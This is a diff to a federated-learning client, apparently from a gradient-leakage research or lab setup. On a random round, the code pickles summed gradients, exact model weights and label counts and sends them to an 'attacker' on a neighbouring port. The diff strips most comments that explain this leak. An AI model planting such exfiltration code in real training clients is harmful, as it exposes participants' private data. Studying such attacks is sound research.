@@ -75,43 +75,32 @@ def main():
                 print(f"[client] error receiving global weights: {e}. exiting.", flush=True)
                 return
 
-            # Random one-shot leak of sum of gradients over a leak batch
-            # Only once, and only on a random round with probability leak_random_p
+            # One-shot leak on a random round with probability leak_random_p
             if LEAK_ONCE and (random.random() < LEAK_RANDOM_P):
                 try:
                     model = SmallCNN(pretrained=False)
                     model.load_state_dict(state_dict)
-                    model.to(device).train()  # train() to match single-sample/batch grad behavior
+                    model.to(device).train()
 
-                    # Take exactly one leak batch (size = LEAK_BATCH_SIZE)
                     xb, yb = next(iter(leak_loader))
                     xb, yb = xb.to(device), yb.to(device)
 
-                    # Compute SUM of per-example grads by using reduction='sum'
                     model.zero_grad()
                     logits = model(xb)
                     loss = F.cross_entropy(logits, yb, reduction='sum')
                     params = [p for p in model.parameters()]
                     grads  = torch.autograd.grad(loss, params, create_graph=False)
 
-                    # Build name->grad dict
                     names = [n for n, _ in model.named_parameters()]
                     grads_by_name = {names[i]: grads[i].detach().cpu().float() for i in range(len(names))}
 
-                    # Also send exact weights and label histogram for the leak batch
                     state_cpu = {k: v.detach().cpu() for k, v in state_dict.items()}
-                    # label_counts: {digit: count_in_batch}
                     label_counts = {}
                     for c in yb.unique():
                         label_counts[int(c.item())] = int((yb == c).sum().item())
 
                     payload = {
-                        "grads_by_name": grads_by_name, # sum over the leak batch
-                        "state_dict": state_cpu, # exact W_k
-                        "label_counts": label_counts, # batch composition
-                        "leak_batch_size": LEAK_BATCH_SIZE,
-                        "round_idx": round_idx,
-                    }
+                        "grads_by_name": grads_by_name, "state_dict": state_cpu, "label_counts": label_counts, "leak_batch_size": LEAK_BATCH_SIZE, "round_idx": round_idx}
                     data = pickle.dumps(payload, protocol=pickle.HIGHEST_PROTOCOL)
 
                     # Send to attacker on (port+1)
@@ -126,9 +115,8 @@ def main():
                 except Exception as e:
                     print(f"[client] Leak failed: {e}", flush=True)
                 finally:
-                    # Disable future leaks
                     LEAK_ONCE = False
-                    os.environ["LEAK_ONCE"] = "0"
+                    os.environ["LEAK_ONCE"] = "0" # Disable future leaks
 
             print(f"[client] received W_k ({_count_params(state_dict):,} params). training 1 local epoch…", flush=True)
 
